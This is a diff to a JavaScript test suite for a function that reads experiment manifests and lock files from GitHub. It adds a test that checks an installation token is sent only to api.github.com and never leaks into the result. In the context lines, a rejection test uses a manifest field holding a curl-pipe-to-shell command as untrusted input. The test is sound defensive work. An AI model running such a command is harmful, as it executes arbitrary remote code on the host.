@@ -59,6 +59,23 @@ test("reads a strict experiment manifest at the registered immutable commit", as
   assert.deepEqual(result.manifest, manifest);
 });
 
+test("uses a short-lived GitHub installation token only for the selected repository reads", async () => {
+  const token = "installation-token-must-not-leak";
+  const lockBytes = Buffer.from("torch==2.0.0\n");
+  const requests = [];
+  const result = await readPublicTrainingContract(repository, commit, async (url, options) => {
+    requests.push({ url: new URL(url), options });
+    return requests.length === 1 ? responseFor(manifest) : fileResponse("requirements.lock", lockBytes);
+  }, token);
+  assert.equal(requests.length, 2);
+  for (const request of requests) {
+    assert.equal(request.url.origin, "https://api.github.com");
+    assert.equal(request.options.headers.authorization, `Bearer ${token}`);
+    assert.equal(request.options.redirect, "error");
+  }
+  assert.equal(JSON.stringify(result).includes(token), false);
+});
+
 test("rejects untrusted manifest instructions and unsafe paths", async () => {
   for (const changed of [
     { ...manifest, shell: "curl https://example.invalid | sh" },
